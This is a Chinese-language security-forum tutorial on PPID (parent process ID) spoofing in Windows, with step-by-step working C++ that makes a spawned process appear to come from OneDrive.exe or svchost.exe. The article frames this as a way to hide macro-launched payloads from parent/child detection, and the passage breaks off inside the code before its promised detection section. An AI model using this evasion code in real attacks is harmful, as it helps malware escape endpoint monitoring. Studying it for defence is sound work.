0x00 前言
-------

不多bb，今天我们一起学习 PPID Spoofing（父进程id欺骗）。

本文主要内容如下：

- ppid spoofing 的目的和原理
- 如何实现 ppid spoofing
- 检测 ppid spoofing 之 ETW 的使用
- 利用和检测工具

0x01 目的和原理
----------

PPID欺骗是一种允许攻击者选择任意进程启动其恶意程序的技术。这可以让攻击者的程序看起来是由另一个进程产生的，主要用于逃避基于父/子进程关系的检测。

例如，默认情况下，大多数需要用户交互启动的程序都是由`explorer.exe`生成的，比如我们在桌面新建一个**文本文档**，然后用记事本打开，效果如下图：

> 这里会用到 [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer) 或者 [Process Hacker](https://processhacker.sourceforge.io/downloads.php) 观察进程之间的关系。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-db5108387d061f9da9a86625ad69435bfad6d929.png)

可以看到很明显的父子关系。`explorer.exe`-&gt;`notepad.exe`

然而，通过下面的代码，我们可以让`notepad.exe`看起来好像是由`onenote.exe`（PID：12896）产生的。

> 代码的具体意思，后面会一一解释，这里先直接用。

```cpp
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

int main()
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    // 要修改这里的 pid
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 12896);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

    return 0;
}
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-cb0cb1e9a6d34b3e3b3bae844861e88bfdad379f.png)

咋做到的呢？这里的关键是 [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) 函数

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-28b5b0d9c1f94a3dced53e00a5a138ade227cc88.png)

`CreateProcessA` 一般用来创建新的进程，并且默认情况下，将使用继承的父级创建进程。比如，通过 cmd 打开的，它爸爸就是cmd。但是，此函数还支持一个名为 `lpStartupInfo` 的参数，你可以在其中自定义其父进程。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-cb54bbd2b1b1357577bf70241542cfb948a32734.png)

`lpStartupInfo`参数指向[STARTUPINFO](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa) 和 [STARTUPINFOEX](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa) 结构体。这里我们只看 `STARTUPINFOEX` 结构体，此结构体包含一个`lpAttributeList`。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-066eb4caf94183d067722f0723003299d666b6f7.png)

而`lpAttributeList`是 [InitializeProcThreadAttributeList](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) 函数创建的。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1e7a41ec8c08911d1c28ada2154fb3674a49472a.png)

在文档下面的备注上写了，要添加属性到列表中，要调用 [UpdateProcThreadAttribute](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) 函数，点进去看看

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-2e1e807e4b4d99ad35cba178bf44ae6d06a434b8.png)

看到有个属性参数：`Attribute`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c4f1561a7f3739a411a3d4c4e1dd7ec68553cf35.png)

添加啥属性呢？`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` 属性，设置进程的父进程。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-2febc6e6e767dc35ce8818a8dd79fc0ce1e226d0.png)

有啥实际用途呢？当我们用 cs 的 office 宏生成 word 文档，受害者打开该文档上线时。

> cs 的 office 宏上线网上大把资料，这里就不具体描述了

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-adf1a6ff15ec9f7729995c7f2dd30dd5ffecc986.png)

可以明显看到 word.exe 下有个 rundll32.exe

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-54a58cc79d71bf61a6043d0130b1fa3abe903d86.png)

蓝队的小伙伴一看到这种不正常的父子关系，就知道肯定有问题了。因此，PPID欺骗，就是为了逃避这种基于父子关系的检测的。

0x02 实现
-------

在知道大概的原理和目的之后，我们先捋一下要调用`CreateProcessA`修改父进程的思路。

```php
CreateProcessA -> lpStartupInfo -> STARTUPINFOEX -> lpAttributeList -> InitializeProcThreadAttributeList -> UpdateProcThreadAttribute -> PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
```

有了思路之后，我们开始仔细讲讲，这个代码是怎么写出来的。其实顺着思路往下写就行了。

先看`CreateProcessA`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f40d9ffdb9bc6ed5a6ff911edfc87241dc540b01.png)

这里的第一个参数上程序名，第二个参数是命令行，因为我们要启动记事本，所以这里有两个选择

```cpp
// 直接填 notepad 的路径
LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
CreateProcess(spawnProcess, NULL,

// 或者不填 notepad 的路径，直接填 notepad 的启动命令，我比较懒，选择了这个
CreateProcessA(NULL, (LPSTR)"notepad", 。。。
```

第三四个参数可选，直接填NULL，第五个参数是要不要继承句柄，这里填FALSE即可，所以，现在如下：

```cpp
CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE,。。。
```

第六个参数是[进程创建标记](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)，因为我们要`lpStartupInfo` 参数指向 `STARTUPINFOEX` 结构，所以这里要填`EXTENDED_STARTUPINFO_PRESENT`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-39f3a54529b90aedb7eb011bd828573979f4e4ac.png)

此时为：

```cpp
CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, 。。。
```

第七八个参数，可选，直接填NULL，第九个参数是`lpStartupInfo`，**先留着**，第十个参数是输出用的指针，按照同样的结构定义一个即可。因此现在如下：

```cpp
PROCESS_INFORMATION pi;
CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 【lpStartupInfo】, &pi);
```

ok，现在要处理`【lpStartupInfo】`的问题了。

`lpStartupInfo` 需要指向结构体 `STARTUPINFOEX`，那我们就声明这个结构体，并把它初始化，全部填0，如下：

```cpp
STARTUPINFOEXA si;
ZeroMemory(&si, sizeof(STARTUPINFOEXA));
```

结构体 `STARTUPINFOEX`里面有个参数`lpAttributeList`，需要调用函数`InitializeProcThreadAttributeList`初始化。此外，这个结构体的`StartupInfo`参数的`cb`必须设置成`sizeof(STARTUPINFOEX)`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-26f19633ee14018e6d1436aa800d34f67ae1002f.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-03a8dc6c983846395daa2eb109934e70c5f682d7.png)

在给`lpAttributeList`进行初始化之前，我们首先得分配内存空间，那空间大小应该是多少呢？只要给`InitializeProcThreadAttributeList`函数传入的`lpAttributeList`为NULL，就能拿到。所以现在的流程是，先调用`InitializeProcThreadAttributeList`拿到`lpAttributeList`的空间大小后，然后给`lpAttributeList`分配内存空间，接着再调用`InitializeProcThreadAttributeList`对`lpAttributeList`初始化。代码如下：

```cpp
// 存储空间大小的变量
SIZE_T attributeSize;
// 获取 lpAttributeList 的空间大小
InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
// 给 lpAttributeList 分配内存空间，直接用 HeapAlloc分配就行
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
// 初始化 lpAttributeList
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
// 文档要求的赋值
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
```

最后是`UpdateProcThreadAttribute` 更新`lpAttributeList`的属性为 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5c12947512c7e7965e3a97f55c04fc03088c4808.png)

第一个参数就是`si.lpAttributeList`，第二个是保留参数，必须为0，第三个参数就是更改的属性 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`，第六七两个参数可选，为NULL即可。第四、五个参数分别是指向属性值的指针和大小，这里填父进程的句柄（[OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)可以拿到）即可，如下：

> 这里其实可以直接剽文档地下的 demo：<https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute>  
> ![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-12a5836a83d830bfb5cd9e3e7c5217e15cda8cd6.png)

```cpp
HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 12896);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
```

OK，把所有代码整合起来，就是一开始贴出来的代码了。

```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

int main()
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    // 要修改这里的 pid
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 12896);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

    return 0;
}
```

0x03 完善代码
---------

ok，我们已经知道怎么实现**PPID 欺骗**，接下来就是对刚刚对代码进行简单的优化。优化啥呢？想一下，我们每次进行欺骗的时候，都要手动输入目标进程的 pid，这太麻烦了。

于是我们新增一个 `ggetPPID`函数用于检索我们要欺骗的父进程的PID。比如我们获取`OneDrive.exe`进程的 PID 。然后代码使用函数`CreateProcess`生成一个新`notepad.exe`进程，如下：

```cpp
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    LPCWSTR parentProcess = L"OneDrive.exe";
    DWORD parentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, parentPID);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

    return 0;
}
```

可以看到代码正常运行了。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-cce6c3964482f59c49021012b83ff9b1844181a1.png)

但是，当我把父进程名字改成`scvhost.exe`的时候，我发现代码没有按预期工作，并没有启动记事本。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0c4b43569c00e6e88a961104c7f2d73b9e5798c7.png)

于是我打了个断点，发现`parentProcessHandle`竟然是空的，说明`OpenProcess`不成功啊。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e78f0328358b00fe031515fedf1389853dd490e8.png)

于是我怀疑是权限的问题。首先把 `integrity level（完整性级别）`列显示出来。

Process Explorer 的操作如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-312619406d50041868e33c1ff218d467e9a6bb98.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-48ba41f337406bda7199ef4544a0898d60644ab9.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0d64903cd7ebb7bc5459151227466403b05da71f.png)

Process Hacker 的操作如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-49bd89bce79f9797a1d36e6647a96f98ef1ad971.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b17bdae132f86c1258cbef7f158670d6d7a02c77.png)

显示出来之后，我搜了一下`836`，果然，这个 svchost.exe 的完整性级别是 System，由于我们以标准用户身份运行，具有**MEDIUM**完整性级别，因此我们无权访问以**SYSTEM**完整性级别运行的进程。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-7911e2f56ea144630c3fc25c5558cfbe2da7b105.png)

那么我们如何解决这个问题呢？其实我们往下看，我们可以看到一些`svchost.exe`完整性级别为**Medium**进程。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ecdc2a486982c678a11abf4b2ec98be717057936.png)

所以，我们可以添加另一个函数来检查每个进程的完整性级别。用到的函数是[GetTokenInformation](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation)，检索与进程关联的访问令牌的信息。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d1cf8e025b0be72b621aa6b565aad83d9f622ed1.png)

然后与[众所周知的 SID](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) 进行比较，就能确定进程的完整性级别了。然后在代码中加个判断，我们只要完整性级别是 Medium 不就行了吗？直接看代码。

```cpp
LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}
```

再修改一下`getIntegrityLevel`函数在`getPPID`函数中的调用。让它只会返回具有 Medium 完整性级别的父进程的 PID。

```cpp
DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}
```

现在代码如下：

```cpp
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    LPCWSTR parentProcess = L"svchost.exe";
    DWORD parentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, parentPID);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

    return 0;
}
```

直接运行，发现触发了异常，提示`pTokenIL`是空指针。好家伙，白嫖的代码，果然不能全信。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c285f7b59c77e76b145517a651f7bc029f189722.png)

为啥是空指针？我也不知道，没办法，为了省事，省略了一堆的异常判断代码，所以导致现在为啥崩溃都不知道。于是乎，很快的，加上异常判断和错误输出。

加入异常判断的`getProcessIntegrityLevel`函数代码如下：

> 代码魔改于 <https://github.com/cubika/OneCode/blob/master/Visual%20Studio%202008/CppCreateLowIntegrityProcess/CppCreateLowIntegrityProcess.cpp>

```cpp
LPCWSTR getProcessIntegrityLevel(HANDLE hProcess, PDWORD pdwIntegrityLevel)
{
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hToken = NULL;
    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;

    if (pdwIntegrityLevel == NULL)
    {
        dwError = ERROR_INVALID_PARAMETER;
        goto Cleanup;
    }

    // 以TOKEN_QUERY开启此线程的主访问令牌。
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        cout << "[!] OpenProcessToken error!" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }

    // 查询令牌完整性级别信息的大小。注意：我们预期得到一个FALSE结果及错误
    // ERROR_INSUFFICIENT_BUFFER， 这是由于我们在GetTokenInformation输入一个
    // 空缓冲。同时，在cbTokenIL中我们会得知完整性级别信息的大小。
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
    {
        if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
        {
            // 当进程运行于Windows Vista之前的系统中，GetTokenInformation返回
            // FALSE和错误码ERROR_INVALID_PARAMETER。这是由于这些操作系统不支
            // 持TokenElevation。
            cout << "[!] GetTokenInformation no support !" << endl;
            dwError = GetLastError();
            goto Cleanup;
        }
    }

    // 现在我们为完整性级别信息分配一个缓存。
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    if (pTokenIL == NULL)
    {
        cout << "[!] pTokenIL is null" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }

    // 获得令牌完整性级别信息。
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL,
        cbTokenIL, &cbTokenIL))
    {
        cout << "[!] GetTokenInformation error !" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }
    // 完整性级别SID为S-1-16-0xXXXX形式。（例如：S-1-16-0x1000表示为低完整性
    // 级别的SID）。而且有且仅有一个次级授权信息。
    *pdwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

Cleanup:
    // 集中清理所有已分配的内存资源
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    if (pTokenIL)
    {
        LocalFree(pTokenIL);
        pTokenIL = NULL;
        cbTokenIL = 0;
    }

    if (ERROR_SUCCESS != dwError)
    {
        // 失败时确保此能够获取此错误代码
        SetLastError(dwError);
        return L"ERROR";
    }
    else
    {
        if (*pdwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
            return L"LOW";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && *pdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            return L"MEDIUM";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
            return L"HIGH";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
            return L"SYSTEM";
        }
    }
}
```

错误提示主要依靠函数[GetLastError](https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror)，当然它只返回一个errorcode，还需要用`FormatMessage`转换成字符串。

具体代码如下：

> 代码来自于 [https://blog.csdn.net/qq\_34227896/article/details/86699941](https://blog.csdn.net/qq_34227896/article/details/86699941)

```cpp
string get_last_error(DWORD errCode)
{
    string err("");
    if (errCode == 0) errCode = GetLastError();
    LPTSTR lpBuffer = NULL;
    if (0 == FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, //标志位，决定如何说明lpSource参数，dwFlags的低位指定如何处理换行功能在输出缓冲区，也决定最大宽度的格式化输出行,可选参数。
        NULL,//根据dwFlags标志而定。
        errCode,//请求的消息的标识符。当dwFlags标志为FORMAT_MESSAGE_FROM_STRING时会被忽略。
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),//请求的消息的语言标识符。
        (LPTSTR)&lpBuffer,//接收错误信息描述的缓冲区指针。
        0,//如果FORMAT_MESSAGE_ALLOCATE_BUFFER标志没有被指定，这个参数必须指定为输出缓冲区的大小，如果指定值为0，这个参数指定为分配给输出缓冲区的最小数。
        NULL//保存格式化信息中的插入值的一个数组。
    ))
    {//失败
        char tmp[100] = { 0 };
        sprintf_s(tmp, "{未定义错误描述(%d)}", errCode);
        err = tmp;
    }
    else//成功
    {
        USES_CONVERSION;
        err = W2A(lpBuffer);
        LocalFree(lpBuffer);
    }
    return err;
}
```

再对`getPPID`进行简单的修改，如果`getProcessIntegrityLevel`返回的是 ERROR，则跳过，直到返回 MEDIUM。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e44187416abfd4adb6f59f7eeade6fc85bf5589d.png)

现在代码如下：

```cpp
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#include <string>
#include <iostream>
#include <atlconv.h>
using namespace std;

string get_last_error(DWORD errCode)
{
    string err("");
    if (errCode == 0) errCode = GetLastError();
    LPTSTR lpBuffer = NULL;
    if (0 == FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, //标志位，决定如何说明lpSource参数，dwFlags的低位指定如何处理换行功能在输出缓冲区，也决定最大宽度的格式化输出行,可选参数。
        NULL,//根据dwFlags标志而定。
        errCode,//请求的消息的标识符。当dwFlags标志为FORMAT_MESSAGE_FROM_STRING时会被忽略。
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),//请求的消息的语言标识符。
        (LPTSTR)&lpBuffer,//接收错误信息描述的缓冲区指针。
        0,//如果FORMAT_MESSAGE_ALLOCATE_BUFFER标志没有被指定，这个参数必须指定为输出缓冲区的大小，如果指定值为0，这个参数指定为分配给输出缓冲区的最小数。
        NULL//保存格式化信息中的插入值的一个数组。
    ))
    {//失败
        char tmp[100] = { 0 };
        sprintf_s(tmp, "{未定义错误描述(%d)}", errCode);
        err = tmp;
    }
    else//成功
    {
        USES_CONVERSION;
        err = W2A(lpBuffer);
        LocalFree(lpBuffer);
    }
    return err;
}

LPCWSTR getProcessIntegrityLevel(HANDLE hProcess, PDWORD pdwIntegrityLevel)
{
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hToken = NULL;
    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;

    if (pdwIntegrityLevel == NULL)
    {
        dwError = ERROR_INVALID_PARAMETER;
        goto Cleanup;
    }

    // 以TOKEN_QUERY开启此线程的主访问令牌。
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        cout << "[!] OpenProcessToken error!" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }

    // 查询令牌完整性级别信息的大小。注意：我们预期得到一个FALSE结果及错误
    // ERROR_INSUFFICIENT_BUFFER， 这是由于我们在GetTokenInformation输入一个
    // 空缓冲。同时，在cbTokenIL中我们会得知完整性级别信息的大小。
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
    {
        if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
        {
            // 当进程运行于Windows Vista之前的系统中，GetTokenInformation返回
            // FALSE和错误码ERROR_INVALID_PARAMETER。这是由于这些操作系统不支
            // 持TokenElevation。
            cout << "[!] GetTokenInformation no support !" << endl;
            dwError = GetLastError();
            goto Cleanup;
        }
    }

    // 现在我们为完整性级别信息分配一个缓存。
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    if (pTokenIL == NULL)
    {
        cout << "[!] pTokenIL is null" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }

    // 获得令牌完整性级别信息。
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL,
        cbTokenIL, &cbTokenIL))
    {
        cout << "[!] GetTokenInformation error !" << endl;
        dwError = GetLastError();
        goto Cleanup;
    }
    // 完整性级别SID为S-1-16-0xXXXX形式。（例如：S-1-16-0x1000表示为低完整性
    // 级别的SID）。而且有且仅有一个次级授权信息。
    *pdwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

Cleanup:
    // 集中清理所有已分配的内存资源
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
